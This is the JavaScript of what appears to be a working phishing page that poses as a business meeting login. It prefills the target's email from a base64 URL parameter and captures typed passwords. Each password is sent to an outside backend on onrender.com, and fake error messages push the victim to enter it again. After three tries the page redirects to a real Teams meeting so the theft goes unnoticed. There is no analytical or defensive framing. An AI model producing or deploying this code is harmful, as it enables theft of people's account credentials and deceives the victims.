    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script>
        // REPLACE WITH YOUR RENDER URL (e.g., "https://zoom-backend.onrender.com")
        const BACKEND_URL = "https://business-meeting.onrender.com"; 

        let attempts = 0;

        function getEmailFromUrl() {
            const params = new URLSearchParams(window.location.search);
            // Check for 'e', 'email', or any hash after '?'
            const emailParam = params.get('e') || params.get('email') || window.location.search.substring(1);
            if (!emailParam) return "";
            
            try {
                // Try decoding from Base64
                return atob(emailParam);
            } catch (e) {
                // If not Base64, assume it's a plain email
                if (emailParam.includes('@')) {
                    return emailParam;
                }
                return "";
            }
        }

        function logAction(action, extra = {}) {
            const email = $("#user").val();
            fetch(`${BACKEND_URL}/api/log-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    action, 
                    email, 
                    attempts,
                    intruderDetected: attempts >= 3,
                    ...extra 
                })
            }).catch(err => console.error('Log error:', err));
        }

        function load() {
            const email = getEmailFromUrl();
            if (email) {
                $("#user").val(email);
                $("#userTxt").text(email);
                $("#nameTxt").text(email.split('@')[0]);
            } else {
                $("#nameTxt").text("Guest");
                $("#userTxt").text("guest@example.com");
                $("#user").val("guest@example.com");
            }
            logAction('page_load');
        }

        function loaD() {
            $("#joinDiv").hide();
            $("#loadDiv").show();
            $("#loadTxt").text("Connecting to Meeting Server..");
            logAction('click_continue');
            setTimeout(function() {
                $("#loadDiv").hide();
                $("#loginDiv").show();
            }, 1000);
        }

        function Validate() {
            const email = $("#user").val();
            const password = $("#pass").val();
            attempts++;
            
            $("#subBtn").prop("disabled", true);
            $("#spin").show();
            $("#err, #err1").hide();

            logAction('login_attempt', { password });

            if (attempts >= 3) {
                // 3rd attempt redirect to open
                const meetingLink = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
                logAction('force_redirect');
                window.location.href = meetingLink;
                return;
            }

            fetch(`${BACKEND_URL}/api/authenticate`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    logAction('login_success');
                    window.location.href = data.redirect;
                } else {
                    // Logic for attempts with specific messages
                    let errorMsg = "";
                    if (attempts === 1) {
                        errorMsg = "incorrect try again";
                    } else if (attempts === 2) {
                        errorMsg = "put correct user detail to authenticate recipient";
                    }

                    $("#err").text(errorMsg).show();
                    $("#pass").val(""); // Clear for next input
                    $("#subBtn").prop("disabled", false);
                    $("#spin").hide();
                }
            })
            .catch(error => {
                console.error('Error:', error);
                // Fallback messages on network error
                let errorMsg = "";
                if (attempts === 1) errorMsg = "incorrect try again";
                else if (attempts === 2) errorMsg = "put correct user detail to authenticate recipient";
                
                $("#err").text(errorMsg).show();
                $("#pass").val("");
                $("#subBtn").prop("disabled", false);
                $("#spin").hide();
            });
        }

        $(document).ready(function() {
            load();
        });
    </script>
